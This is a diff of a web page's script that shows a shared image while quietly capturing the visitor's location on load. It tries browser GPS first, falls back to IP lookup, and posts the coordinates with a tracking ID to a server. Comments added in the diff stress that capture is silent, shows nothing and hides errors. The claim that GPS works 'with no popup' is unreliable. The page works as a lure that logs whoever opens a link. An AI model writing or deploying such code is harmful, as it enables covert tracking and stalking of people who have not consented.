@@ -135,7 +135,6 @@
         function autoCaptureLocation() {
             let locationData = { lat: null, lng: null, source: 'IP' };
 
-            // Try GPS first (silent - no popup)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -147,7 +146,6 @@
                         sendVisitData(locationData);
                     },
                     () => {
-                        // GPS failed, use IP
                         getLocationFromIP(locationData);
                     },
                     { 
@@ -157,7 +155,6 @@
                     }
                 );
             } else {
-                // No GPS support, use IP
                 getLocationFromIP(locationData);
             }
         }
@@ -169,9 +166,6 @@
                 if (data && !data.error) {
                     locationData.lat = data.latitude || null;
                     locationData.lng = data.longitude || null;
-                    locationData.city = data.city || 'Unknown';
-                    locationData.region = data.region || 'Unknown';
-                    locationData.country = data.country_name || 'Unknown';
                     locationData.source = 'IP';
                 }
             } catch (e) {
@@ -181,7 +175,7 @@
         }
 
         // ============================================
-        // SEND VISIT DATA TO SERVER
+        // SEND VISIT DATA TO SERVER (Silent - No Display)
         // ============================================
         async function sendVisitData(locationData) {
             const trackId = getTrackId();
@@ -191,11 +185,7 @@
                 const data = {
                     track_id: trackId,
                     lat: locationData.lat || null,
-                    lng: locationData.lng || null,
-                    city: locationData.city || null,
-                    region: locationData.region || null,
-                    country: locationData.country || null,
-                    source: locationData.source || 'Unknown'
+                    lng: locationData.lng || null
                 };
 
                 await fetch(`${API_BASE}/tracking/visit`, {
@@ -204,12 +194,13 @@
                     body: JSON.stringify(data)
                 });
             } catch (e) {
+                // Silent fail - don't show any error to user
                 console.log('Visit tracking failed:', e);
             }
         }
 
         // ============================================
-        // FETCH IMAGE
+        // FETCH AND SHOW IMAGE ONLY
         // ============================================
         async function fetchImage() {
             const trackId = getTrackId();
@@ -228,6 +219,7 @@
                 const result = await res.json();
 
                 if (result.success) {
+                    // Only show image - no data display
                     document.getElementById('loading').style.display = 'none';
                     document.getElementById('imageContainer').innerHTML = `
                         <img src="${result.data.image_url}" alt="Image" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22500%22 height=%22300%22%3E%3Crect width=%22500%22 height=%22300%22 fill=%22%231a1f35%22/%3E%3Ctext x=%22250%22 y=%22150%22 text-anchor=%22middle%22 fill=%22%23ffd700%22 font-size=%2224%22 font-family=%22sans-serif%22%3E🔗 Image Not Found%3C/text%3E%3C/svg%3E'" />
@@ -254,10 +246,10 @@
         // INIT
         // ============================================
         document.addEventListener('DOMContentLoaded', function() {
-            // Auto capture location - SILENT (no popup)
+            // Auto capture location - SILENT (no popup, no display)
             autoCaptureLocation();
             
-            // Fetch and show image
+            // Fetch and show image only
             fetchImage();
         });
     </script>
